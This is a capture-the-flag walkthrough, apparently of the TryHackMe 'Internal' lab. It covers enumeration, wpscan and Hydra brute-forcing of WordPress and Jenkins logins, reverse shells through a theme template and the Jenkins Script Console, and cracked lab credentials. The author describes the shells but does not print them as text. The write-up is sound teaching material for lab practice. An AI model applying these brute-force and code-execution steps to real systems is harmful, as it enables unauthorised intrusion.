---
title: Internal ⚙️
tags:
  - Black-box
  - Web
  - Apache
  - Wordpress
  - Brute-Forcing
  - Jenkins
---
![](Pasted%20image%2020240531151047.png)

## Scope

>[!Note]
>The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
>
>- User.txt
>- Root.txt  
>
>Additionally, the client has provided the following scope allowances:
>
>- Ensure that you modify your hosts file to reflect `internal.thm`
>- Any tools or techniques are permitted in this engagement
>- Locate and note all vulnerabilities found
>- Submit the flags discovered to the dashboard
>- Only the IP address assigned to your machine is in scope

First of all, I added the new host to my known ones:

```shell
sudo echo "10.10.59.31 internal.thm" | sudo tee -a /etc/hosts
```

Then I started performing an `Nmap` scan with:

```shell
nmap -sC -T4 -p- internal.thm > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 15:14 CEST
Nmap scan report for internal.thm (10.10.244.254)
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works

Nmap done: 1 IP address (1 host up) scanned in 28.57 seconds
```

Then I went to take a look to the webpage and its code:

![](Pasted%20image%2020240531151552.png)

> Seems to be the default Apache page

So I decided to perform some enumeration with [dirsearch 📁](/notes/Tools/dirsearch.md):

```shell
dirsearch -u http://internal.thm 
[REDACTED]
[15:17:24] 301 -  311B  - /blog  ->  http://internal.thm/blog/              
[15:17:28] 200 -    2KB - /blog/wp-login.php                                
[15:17:28] 200 -   18KB - /blog/                                            
[15:17:34] 301 -  317B  - /javascript  ->  http://internal.thm/javascript/  
[15:17:43] 301 -  317B  - /phpmyadmin  ->  http://internal.thm/phpmyadmin/  
[15:17:44] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[15:17:45] 200 -    3KB - /phpmyadmin/                                      
[15:17:45] 200 -    3KB - /phpmyadmin/index.php                             
[15:17:49] 403 -  277B  - /server-status                                    
[15:17:49] 403 -  277B  - /server-status/
[15:18:00] 200 -    2KB - /wordpress/wp-login.php                           
[15:18:00] 404 -   51KB - /wordpress/
```

So I decided to check the `/blog` section:

![](Pasted%20image%2020240531151907.png)

It turned out to be a [WordPress 🍔](/notes/wordpress.md), so I decided to use `wpscan`:

```shell
wpscan --url "http://internal.thm/blog/"
[REDACTED]
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.6
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
```

I found that the current version is `5.4.2`, so I decided to find a CVE for this version.

I didn't find anything interesting, so I decided to perform a user enumeration for a later brute force attack:

```shell
wpscan --url "http://internal.thm/blog/" -U users.txt -P /usr/share/wordlists/rockyou.txt

[REDACTED]
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                         
Trying admin / ionela Time: 00:02:12 <                                     > (3885 / 14348277)  0.02%  ETA: ??:??:??
```

> So I logged in as admin :D

![](Pasted%20image%2020240531153728.png)

Now it's time to get RCE, so again in [WordPress 🍔](/notes/wordpress.md) I've got some RCEs detailed:

> Basically I uploaded a Reverse shell to the `404.php` template and then I looked up for a non-existing post in the blog

I got RCE:

![](Pasted%20image%2020240531155032.png)

Once stabilized, I decided to take a look inside the `/home/`, but got no permissions to read `aubreanna` home directory, so I searched in `/var/www/html` directory.

As I didn't find anything, I decided to check `/opt/` 'cuz it's a place where you don't expect to be nothing useful, but I found `aubreanna` credentials:

![](Pasted%20image%2020240531155720.png)

So I logged in and got user flag:

![](Pasted%20image%2020240531155833.png)

Inside the same directory, there is a `jenkins.txt`, which tells us that jenkins is running:

![](Pasted%20image%2020240531160022.png)

So I tunneled the connection to my machine via ssh:

```shell
ssh -L 8080:127.0.0.1:8080 aubreanna@internal.thm
```

Now in my browser I searched for: `http://127.0.0.1:8080`, which showed me the Jenkins login:

![](Pasted%20image%2020240531160550.png)

I tried the credentials of the user, but they didn't work, so I decided to brute-force the login.
1. First, I caught the petition with Burp

![](Pasted%20image%2020240531161951.png)

2. Then I performed a http-form-post attack with [Hydra 🐍](/notes/tools/Hydra.md)

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in&Login:Invalid username or password"

[REDACTED]
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-31 16:24:21
```

Once I got in, i decided to perform a RCE detailed in my note [Jenkins 👨‍🎓](/notes/Jenkins.md)

> Basically consists on inserting a reverse shell on the Script Console

![](Pasted%20image%2020240531164306.png)

> We've got RCE!

So now, let's try to find the `root` password. I look inside the `/opt` as before:

```shell
cd /opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

So we've got the `root` password. After this, we can get the root flag:

![](Pasted%20image%2020240531164747.png)

==Machine pwned!==